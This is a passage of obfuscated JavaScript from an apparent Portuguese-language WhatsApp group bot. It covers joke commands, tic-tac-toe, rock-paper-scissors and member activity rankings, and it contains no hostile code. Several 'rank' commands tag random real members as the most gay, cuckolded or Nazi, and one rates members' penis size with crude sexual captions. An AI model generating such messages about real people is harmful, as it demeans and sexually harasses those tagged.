                const _0x40c5b7 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x4783ee,
                  'caption': "O quanto você é gostoso? 😏\n\n「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱ gostoso 😝",
                  'gifPlayback': true,
                  'mentions': [_0x1911ab]
                }, _0x40c5b7);
              }, 7000);
              break;
            case "gostosa":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando a sua ficha de gostosa : @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                'mentions': [_0x1911ab]
              });
              setTimeout(async () => {
                random = '' + Math.floor(Math.random() * 110);
                const _0x7e7933 = {
                  url: imggostosa
                };
                const _0x2834e3 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x7e7933,
                  'caption': "O quanto você é gostosa? 😏\n\n「 @" + _0x1911ab.split('@')[0] + " 」Você é: ❰ " + random + "% ❱ gostosa 😳",
                  'mentions': [_0x1911ab]
                }, _0x2834e3);
              }, 7000);
              break;
            case "matar":
            case "mata":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque o alvo que você quer matar, a mensagem ou o @");
              }
              const _0x708c97 = {
                url: matarcmd
              };
              const _0x4e97ec = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'video': _0x708c97,
                'gifPlayback': true,
                'caption': "Você Acabou de matar o(a) @" + _0x5e13bf.split('@')[0] + " 😈👹",
                'mentions': [_0x5e13bf]
              }, _0x4e97ec);
              break;
            case "beijo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque a pessoa que você quer beijar, a mensagem ou o @");
              }
              gifbj = beijocmd[Math.floor(Math.random() * beijocmd.length)];
              const _0x632d06 = {
                url: gifbj
              };
              const _0xcc5f63 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'video': _0x632d06,
                'gifPlayback': true,
                'caption': "Você deu um beijo gostoso na(o) @" + _0x5e13bf.split('@')[0] + " 😁👉👈❤",
                'mentions': [_0x5e13bf]
              }, _0xcc5f63);
              break;
            case "abraco":
            case "abraço":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque a pessoa que você quer beijar, a mensagem ou o @");
              }
              const _0x3a0b4d = {
                url: abracocmd
              };
              const _0x5a6cc8 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'video': _0x3a0b4d,
                'gifPlayback': true,
                'caption': "Você deu um abraço gostoso na(o) @" + _0x5e13bf.split('@')[0] + " 😁👉👈❤",
                'mentions': [_0x5e13bf]
              }, _0x5a6cc8);
              break;
            case "casamento":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque a pessoa que você quer beijar, a mensagem ou o @");
              }
              const _0x24fa46 = {
                url: casamentocmd
              };
              const _0x5e01c4 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'video': _0x24fa46,
                'gifPlayback': true,
                'caption': "Você pediu em casamento a(o) @" + _0x5e13bf.split('@')[0] + " 😁👉👈❤",
                'mentions': [_0x5e13bf]
              }, _0x5e01c4);
              break;
            case "biografia":
              try {
                var _0x35f590 = await _0x5196be.fetchStatus(_0x3e445f);
              } catch {
                var _0x35f590 = "Privado ou inexistente. ";
              }
              _0x50740b(_0x35f590);
              break;
            case "tapa":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque o alvo que você quer da um tapa, a mensagem ou o @");
              }
              const _0x5f55e1 = {
                url: tapacmd
              };
              const _0x29b9fd = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'video': _0x5f55e1,
                'gifPlayback': true,
                'caption': "Você Acabou de da um tapa em: 😏 @" + _0x5e13bf.split('@')[0] + " 🔥",
                'mentions': [_0x5e13bf]
              }, _0x29b9fd);
              break;
            case "chute":
            case "chutar":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("marque o alvo que você quer da um chute, a mensagem ou o @");
              }
              const _0x45ab8a = {
                url: chutecmd
              };
              const _0x4aef0b = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'video': _0x45ab8a,
                'gifPlayback': true,
                'caption': "Você Acabou de da um chute em @" + _0x5e13bf.split('@')[0] + " 🤡",
                'mentions': [_0x5e13bf]
              }, _0x4aef0b);
              break;
            case "dogolpe":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("Marque a mensagem com o comando ou marque o @ do usuário..");
              }
              random = '' + Math.floor(Math.random() * 100);
              _0x5196be.sendMessage(_0x346d97, {
                'text': "*GOLPISTA ENCONTRADO👉🏻*\n\n*GOLPISTA* : *@" + _0x5e13bf.split('@')[0] + "*\n*PORCENTAGEM DO GOLPE* : " + random + "%😂\n\nEle(a) gosta de ferir sentimentos 😢",
                'mentions': [_0x5e13bf]
              });
              break;
            case "casal":
            case "shippo":
            case "shipo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x5c6233) {
                return _0x50740b(_0x24f408);
              }
              let _0xbbfc12 = [];
              let _0xbafc5a = _0x42d32c ? _0x42d32c : _0xd79836?.["length"] > 1 ? _0xd79836[0] : groupMembers[Math.floor(Math.random() * groupMembers.length)].id;
              let _0x2c7fc4 = _0x42d32c && !_0xd79836 ? groupMembers[Math.floor(Math.random() * groupMembers.length)].id : _0xd79836?.["length"] == 1 ? _0xd79836[0] : _0xd79836?.["length"] > 1 ? _0xd79836[1] : groupMembers[Math.floor(Math.random() * groupMembers.length)].id;
              let _0x4cda6c = Math.floor(Math.random() * 100);
              let _0x4242eb;
              if (_0x4cda6c >= 90) {
                _0x4242eb = "Um casal perfeito! 😍";
              } else {
                if (_0x4cda6c >= 80) {
                  _0x4242eb = "Vocês são quase perfeitos juntos! 😘";
                } else {
                  if (_0x4cda6c >= 70) {
                    _0x4242eb = "Vocês têm uma grande chance de dar certo! 😊";
                  } else {
                    if (_0x4cda6c >= 60) {
                      _0x4242eb = "Vocês combinam bastante! 😉";
                    } else {
                      if (_0x4cda6c >= 50) {
                        _0x4242eb = "Pode dar certo se ambos se esforçarem. 🤔";
                      } else {
                        if (_0x4cda6c >= 40) {
                          _0x4242eb = "Ainda tem muito espaço para crescer! 😅";
                        } else {
                          if (_0x4cda6c >= 30) {
                            _0x4242eb = "Há alguns obstáculos, mas nada impossível. 😬";
                          } else {
                            if (_0x4cda6c >= 20) {
                              _0x4242eb = "Vocês precisarão de muito trabalho para isso funcionar. 😕";
                            } else if (_0x4cda6c >= 10) {
                              _0x4242eb = "Talvez não seja a melhor combinação... 😟";
                            } else {
                              _0x4242eb = "Não parece muito promissor... 😢";
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              let _0x29f7cd = "🌟 Casal do grupo com " + _0x4cda6c + "% ✨ de chance pra da certo 😏: " + _0x4242eb + "\n\n☈ 💑 @" + _0xbafc5a?.["split"]('@')[0] + "\nﮩ٨ـﮩﮩ٨ـ♡ﮩ٨ـﮩﮩ٨ـ\n☈ 💑 @" + _0x2c7fc4?.["split"]('@')[0] + "\n\nBot: " + NomeDoBot;
              _0xbbfc12.push(_0xbafc5a);
              _0xbbfc12.push(_0x2c7fc4);
              const _0x13c132 = {
                url: "https://xatimg.com/image/K88c2BkQwlcF.jpg"
              };
              const _0x331872 = {
                image: _0x13c132,
                caption: _0x29f7cd,
                mentions: _0xbbfc12
              };
              _0x5196be.sendMessage(_0x346d97, _0x331872);
              break;
            case "ranklevel":
            case "rankpatente":
              var _0x17f438 = countMessage.map(_0x338419 => _0x338419.groupId).indexOf(_0x346d97);
              var _0x37575f = countMessage[_0x17f438].numbers.map(_0x2ad475 => _0x2ad475);
              _0x37575f.sort((_0x161d9, _0x40d6f0) => _0x161d9.messages + _0x161d9.cmd_messages < _0x40d6f0.cmd_messages + _0x40d6f0.messages ? 0 : -1);
              _0x1f75eb = [];
              blad = "\n┌───────────────┐\n│  RANK DE LEVEL & PATENTES\n";
              for (_0x3194f3 = 0; _0x3194f3 < (_0x37575f.length < 5 ? _0x37575f.length : 5); _0x3194f3++) {
                var _0x5f093a = patentes.map(_0x262f5d => _0x262f5d.grupoID).indexOf(_0x346d97);
                var _0x2c40cb = patentes[_0x5f093a].usus.map(_0x4dcd06 => _0x4dcd06.id).indexOf(_0x37575f[_0x3194f3].id);
                if (_0x3194f3 != null) {
                  blad += "\n┌───────────────\n│ " + (_0x3194f3 + 1) + "º : @" + _0x37575f[_0x3194f3].id.split('@')[0] + "\n└─────\n   ༶ Level: " + patentes[_0x5f093a].usus[_0x2c40cb].level_usu + "\n   ༶ Patente: " + patentes[_0x5f093a].usus[_0x2c40cb].patente_usu + "\n   ༶ Conectado em: " + _0x37575f[_0x3194f3].aparelho + "\n└────────────\n";
                }
                _0x1f75eb.push(_0x37575f[_0x3194f3].id);
              }
              _0x1106fd(blad, _0x1f75eb, true);
              break;
            case "rankativos":
            case "rankativo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              var _0x17f438 = countMessage.map(_0x553baf => _0x553baf.groupId).indexOf(_0x346d97);
              var _0x37575f = countMessage[_0x17f438].numbers.map(_0x46302f => _0x46302f);
              _0x37575f.sort((_0x1f1ffe, _0x53206b) => _0x1f1ffe.messages + _0x1f1ffe.cmd_messages < _0x53206b.cmd_messages + _0x53206b.messages ? 0 : -1);
              _0x1f75eb = [];
              blad = "\n╔┉✼┉═༺◈✼❄️✼◈༻═┉✼┉╗\n║    RANK DOS ATIVOS DO GRUPO\n╚┉✼┉═༺◈✼❄️✼◈༻═┉✼┉╝";
              for (_0x3194f3 = 0; _0x3194f3 < (_0x37575f.length < '' + (!_0x11e99e ? '5' : '' + _0x11e99e) ? _0x37575f.length : '' + (!_0x11e99e ? '5' : '' + _0x11e99e)); _0x3194f3++) {
                var _0x5f093a = patentes.map(_0x792afb => _0x792afb.grupoID).indexOf(_0x346d97);
                var _0x2c40cb = patentes[_0x5f093a].usus.map(_0x45d1cb => _0x45d1cb.id).indexOf(_0x37575f[_0x3194f3].id);
                if (_0x3194f3 != null) {
                  blad += "\n╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗\n║ " + (_0x3194f3 + 1) + "º : @" + _0x37575f[_0x3194f3].id.split('@')[0] + "\n╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝\n   ❄️ Mensagens: " + _0x37575f[_0x3194f3].messages + "\n   ❄️ Comandos dados: " + _0x37575f[_0x3194f3].cmd_messages + (_0x2c40cb < 0 ? '' : "\n   ❄️ Patente: " + patentes[_0x5f093a].usus[_0x2c40cb].patente_usu) + "\n   ❄️ Conectado em: " + _0x37575f[_0x3194f3].aparelho + "\n   ❄️ Figurinhas: " + _0x37575f[_0x3194f3].figus + "\n╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝\n";
                }
                _0x1f75eb.push(_0x37575f[_0x3194f3].id);
              }
              _0x1106fd(blad, _0x1f75eb, true);
              break;
            case "rankfigurinhas":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              var _0x17f438 = countMessage.map(_0x4d2d02 => _0x4d2d02.groupId).indexOf(_0x346d97);
              var _0x37575f = countMessage[_0x17f438].numbers.map(_0x17e884 => _0x17e884);
              _0x37575f.sort((_0x272efb, _0x5b34fe) => _0x272efb.figus < _0x5b34fe.figus ? 0 : -1);
              _0x1f75eb = [];
              blad = "\n  ╔┉✼┉═༺◈✼❄️✼◈༻═┉✼┉╗\n  ║    RANK DAS FIGURINHAS DO GRUPO\n╚┉✼┉═༺◈✼❄️✼◈༻═┉✼┉╝";
              for (_0x3194f3 = 0; _0x3194f3 < (_0x37575f.length < '' + (!_0x11e99e ? '5' : '' + _0x11e99e) ? _0x37575f.length : '' + (!_0x11e99e ? '5' : '' + _0x11e99e)); _0x3194f3++) {
                var _0x5f093a = patentes.map(_0x1c0cef => _0x1c0cef.grupoID).indexOf(_0x346d97);
                var _0x2c40cb = patentes[_0x5f093a].usus.map(_0x4a3562 => _0x4a3562.id).indexOf(_0x37575f[_0x3194f3].id);
                if (_0x3194f3 != null) {
                  blad += "\n  ╔┉┉┉┉┉┉┉┉┉┉┉┉┉┉╗\n  ║ " + (_0x3194f3 + 1) + "º : @" + _0x37575f[_0x3194f3].id.split('@')[0] + "\n  ╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝\n❄️ Figurinhas: " + _0x37575f[_0x3194f3].figus + "\n❄️ Mensagens: " + _0x37575f[_0x3194f3].messages + "\n❄️ Comandos dados: " + _0x37575f[_0x3194f3].cmd_messages + (_0x2c40cb < 0 ? '' : "\n❄️ Patente: " + patentes[_0x5f093a].usus[_0x2c40cb].patente_usu) + "\n❄️ Conectado em: " + _0x37575f[_0x3194f3].aparelho + "\n╚┉┉┉┉┉┉┉┉┉┉┉┉┉┉╝\n";
                }
                _0x1f75eb.push(_0x37575f[_0x3194f3].id);
              }
              _0x1106fd(blad, _0x1f75eb, true);
              break;
            case "rankativog":
            case "rankativosg":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                await _0xc7d21a();
                let _0x167e95 = [];
                for (let _0x48a5bd of countMessage) {
                  let _0x3cf1a2 = _0x48a5bd.numbers.map(_0x445654 => _0x445654);
                  _0x3cf1a2.sort((_0x5f5da8, _0x411d35) => (_0x5f5da8.figus == undefined ? _0x5f5da8.figus = 0 : _0x5f5da8.figus + _0x5f5da8.messages + _0x5f5da8.cmd_messages) < (_0x411d35.figus == undefined ? _0x411d35.figus = 0 : _0x411d35.figus + _0x411d35.cmd_messages + _0x411d35.messages) ? 0 : -1);
                  _0x167e95.push(_0x3cf1a2);
                }
                let _0x330d43 = [];
                for (let _0x23df6c of _0x167e95) {
                  for (let _0x5854a6 of _0x23df6c) {
                    _0x330d43.push(_0x5854a6);
                  }
                }
                _0x330d43.sort((_0x3230cd, _0xb40508) => (_0x3230cd.figus == undefined ? _0x3230cd.figus = 0 : _0x3230cd.figus + _0x3230cd.messages + _0x3230cd.cmd_messages) < (_0xb40508.figus == undefined ? _0xb40508.figus = 0 : _0xb40508.figus + _0xb40508.cmd_messages + _0xb40508.messages) ? 0 : -1);
                let _0x4b8608 = "\n┌────────────────┐\n│ RANK DOS MEMBROS MAIS ATIVOS DE TODOS OS GRUPOS\n";
                for (let _0x16bcfd = 0; _0x16bcfd < (_0x330d43.length < 10 ? _0x330d43.length : 10); _0x16bcfd++) {
                  _0x4b8608 += "\n┌───────────────\n│ " + (_0x16bcfd + 1) + "º : @" + _0x330d43[_0x16bcfd].id.split('@')[0] + "\n└─────\n༶ Mensagens: " + _0x330d43[_0x16bcfd].messages + "\n   ༶ Comandos dados: " + _0x330d43[_0x16bcfd].cmd_messages + "\n   ༶ Conectado em: " + _0x330d43[_0x16bcfd].aparelho + "\n   ༶ Figurinhas: " + _0x330d43[_0x16bcfd].figus + "\n└────────────\n";
                }
                _0x1106fd(_0x4b8608, [], true);
              }
              break;
            case "checkativo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              await _0xc7d21a();
              if (_0x1a849c.indexOf(_0x346d97) < 0) {
                return _0x50740b("O bot não tem ainda dados sobre o grupo");
              }
              var _0x52a298 = _0x1a849c.indexOf(_0x346d97);
              if (!_0x5e13bf || _0xd79836[1]) {
                return _0x50740b("Marque o @ de quem deseja puxar a atividade / Só pode um por vez..");
              }
              if (_0x114666.indexOf(_0x5e13bf) >= 0) {
                var _0x4972e8 = _0x114666.indexOf(_0x5e13bf);
                var _0x1ab3c3 = countMessage[_0x52a298].numbers[_0x4972e8];
                _0x1106fd("𖣘⃟ᗒ Consulta das atividade de\n𖣘⃟ᗒ @" + _0x5e13bf.split('@')[0] + " no grupo: " + _0x3baffe + "\n𖣘⃟ᗒ Mensagens: " + _0x1ab3c3.messages + "\n𖣘⃟ᗒ Comandos dados: " + _0x1ab3c3.cmd_messages + "\n𖣘⃟ᗒ Conectado em: " + _0x1ab3c3.aparelho + "\n𖣘⃟   Figurinhas: " + _0x1ab3c3.figus, [_0x5e13bf], true);
              } else {
                _0x1106fd("⋆⃟ۣۜ᭪➣ Consulta da atividade de ⋆⃟ۣۜ᭪➣ @" + _0x5e13bf.split('@')[0] + " no grupo\n⋆⃟ۣۜ᭪➣ Mensagens: 0\n⋆⃟ۣۜ᭪➣ Comandos dados: 0", [_0x5e13bf], true);
              }
              break;
            case "rankgay":
            case "rankgays":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x5172a7 = "*🤖RANK DOS 5 MAIS GAYS DO GRUPO [ " + _0x3baffe + " ]🏳‍🌈*\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x5172a7 += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x5172a7, rnkgay);
              }
              break;
            case "rankgado":
            case "rankgados":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x3d90fc = "RANK DOS 5 MAIS GADO DO GRUPO 🐂🐃\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x3d90fc += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x3d90fc, rnkgado);
              }
              break;
            case "rankcorno":
            case "rankcornos":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x33ecde = "RANK DOS 5 MAIS CORNO DO GRUPO 🐂\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x33ecde += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x33ecde, rnkcorno, _0xd2050d);
              }
              break;
            case "rankgostosos":
            case "rankgostoso":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x3d53b5 = "RANK DOS 5 MAIS GOSTOSOS DO GRUPO 😏🔥\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x3d53b5 += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x3d53b5, rnkgostoso);
              }
              break;
            case "rankgostosas":
            case "rankgostosa":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0xad3ac0 = "RANK DAS 5 MAIS GOSTOSAS DO GRUPO 😏🔥\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0xad3ac0 += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0xad3ac0, rnkgostosa);
              }
              break;
            case "ranknazista":
            case "ranknazistas":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x186eb3 = "*💂‍♂RANK DOS 5 MAIS NAZISTAS DO GRUPO 卐🤡*\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x186eb3 += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x186eb3, rnknazista);
              }
              break;
            case "rankotaku":
            case "rankotakus":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x7ca9c0 = "*㊙ RANK DOS 5 MAIS OTAKU DO GRUPO ( ˶•̀ _•́ ˶)*\n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x7ca9c0 += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x7ca9c0, rnkotaku);
              }
              break;
            case "rankpau":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                let _0x33082a = "*RANK DOS 5 PAU MAIOR DO GRUPO 📏*\n\n";
                TMPAU = ["Pequeno pra cact, se mata maluco 🥴", "Pequenininho chega ser até fofo 🥺", "Menor que meu dedo mindinho pequeno demais 😑", "Até que dá sentir, tá na média 😌", "Grandinho 🥵", "Grande até ", "Gigantesco igual meu braço 😖", "Enorme quase chega no útero 🤧", "Grandão demais em, e uii 🤯", "Vara de pegar manga, grande demais, como sai na rua assim??", "Que grandão em, nasceu metade animal 😳"];
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  _0x33082a += TMPAU[Math.floor(Math.random() * TMPAU.length)] + " _- @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(_0x33082a, rnkpau);
              }
              break;
            case "rankhetero":
            case "rankheteros":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b(_0x24f408);
                }
                ABC8 = "*🗿RANK DOS 5 MAIS HETEROS DO GRUPO [ " + _0x3baffe + " ]🗿* \n\n";
                for (var _0x3194f3 = 0; _0x3194f3 < 5; _0x3194f3++) {
                  ABC8 += Math.floor(Math.random() * 100) + "% @" + _0x546a1f[Math.floor(Math.random() * _0x546a1f.length)].split('@')[0] + "\n\n";
                }
                _0x3b76ab(ABC8, rnkhetero);
              }
              break;
            case "jogodavelha":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xd79836) {
                return _0x50740b("Marque junto com o comando, o @ do usuário que deseja desafiar..");
              }
              if (_0x3571af != false) {
                const _0x437990 = setGame('' + _0x346d97);
                const _0x40dbbc = _0x437990._matrix;
                const _0x569f74 = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n     \n[❗] Alguém está jogando no momento...\n\n@" + _0x437990.X + " VS @" + _0x437990.O + "\n     \n❌ : @" + _0x437990.X + "\n⭕ : @" + _0x437990.O + "\n     \n Sua vez : @" + (_0x437990.turn == 'X' ? _0x437990.X : _0x437990.O) + "\n     \n" + _0x40dbbc[0][0] + "  " + _0x40dbbc[0][1] + "  " + _0x40dbbc[0][2] + "\n" + _0x40dbbc[1][0] + "  " + _0x40dbbc[1][1] + "  " + _0x40dbbc[1][2] + "\n" + _0x40dbbc[2][0] + "  " + _0x40dbbc[2][1] + "  " + _0x40dbbc[2][2] + "\n\ncaso queira resetar o jogo, mande um adm ou os jogadores que estão jogando utilizar o comando " + _0x141936 + "rv\n";
                _0x5dcc57(_0x569f74);
                return;
              }
              if (_0x11e99e.length === 1) {
                return _0x50740b("*⟅❗⟆ Jogue com Alguem!!!!*\n*para inicar a partida : " + (_0x141936 + _0x267d4b) + " @membro do gp*");
              }
              const _0x2432ff = setGame('' + _0x346d97);
              console.log("Start No jogodavelha " + _0x2432ff.session);
              _0x2432ff.status = false;
              _0x2432ff.X = _0x246d48.replace("@s.whatsapp.net", '');
              _0x2432ff.O = _0x366b8b[1].replace('@', '');
              var _0x54b5e1 = ['' + _0x2432ff.X, '' + _0x2432ff.O];
              fs.writeFileSync("./armor/tictactoe/db/" + _0x346d97 + ".json", JSON.stringify(_0x2432ff, null, 2));
              const _0x5aa5f3 = "*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*\n \n@" + _0x246d48.replace("@s.whatsapp.net", '') + " _está te desafiando para uma partida de jogo da velha..._\n_[ " + _0x366b8b[1] + " ] Use *『S』* para aceitar ou *『N』* para não aceitar..._\n\nEm caso de problemas, marque algum administrador para resetar o jogo com o comando " + _0x141936 + 'rv';
              _0x5d29d0 = [_0x246d48, _0x43dea0];
              _0x1106fd(_0x5aa5f3, _0x5d29d0, true);
              break;
            case "resetarvelha":
            case "resetavelha":
            case "resetarv":
            case "resetav":
            case "resetvelha":
            case 'rv':
              if (!_0x246d48.includes(_0x3571af?.['X']) && !_0x246d48.includes(_0x3571af?.['O']) && !_0x3f2f63) {
                return _0x50740b("Fale com algum dos jogadores que jogaram ou espere eles terminar para\nvocê jogar, se não tiver nenhum dos 2 online, fale com algum adm para digitar " + _0x141936 + "rv para resetar o jogo.");
              }
              if (fs.existsSync("./armor/tictactoe/db/" + _0x346d97 + ".json")) {
                DLT_FL("./armor/tictactoe/db/" + _0x346d97 + ".json");
                _0x50740b("Jogo da velha resetado com sucesso nesse grupo!");
              } else {
                _0x50740b("Não a nenhuma sessão em andamento...");
              }
              break;
            case "ppt2":
              if (_0x23d865.length < 1) {
                return _0x50740b("Você deve digitar " + _0x141936 + "ppt pedra, " + _0x141936 + "ppt papel ou " + _0x141936 + "ppt tesoura");
              }
              ppt = ["pedra", "papel", "tesoura"];
              ppy = ppt[Math.floor(Math.random() * ppt.length)];
              ppg = Math.floor(Math.random() * 1) + 10;
              pptb = ppy;
              if (pptb == "pedra" && _0x23d865 == "papel" || pptb == "papel" && _0x23d865 == "tesoura" || pptb == "tesoura" && _0x23d865 == "pedra") {
                var _0x2993c1 = "vitoria";
              } else {
                if (pptb == "pedra" && _0x23d865 == "tesoura" || pptb == "papel" && _0x23d865 == "pedra" || pptb == "tesoura" && _0x23d865 == "papel") {
                  var _0x2993c1 = "derrota";
                } else {
                  if (pptb == "pedra" && _0x23d865 == "pedra" || pptb == "papel" && _0x23d865 == "papel" || pptb == "tesoura" && _0x23d865 == "tesoura") {
                    var _0x2993c1 = "empate";
                  } else {
                    if (_0x2993c1 = "undefined") {
                      return _0x50740b("Você deve digitar " + _0x141936 + "ppt pedra, " + _0x141936 + "ppt papel ou " + _0x141936 + "ppt tesoura");
                    }
                  }
                }
              }
              if (_0x2993c1 == "vitoria") {
                var _0x2157ac = "Vitória do jogador";
              }
              if (_0x2993c1 == "derrota") {
                var _0x2157ac = "A vitória é do BOT";
              }
              if (_0x2993c1 == "empate") {
                var _0x2157ac = "O jogo terminou em empate";
              }
              _0x50740b(NomeDoBot + " jogou: " + pptb + "\nO jogador jogou: " + _0x23d865 + "\n\n" + _0x2157ac);
              break;
            case "bot":
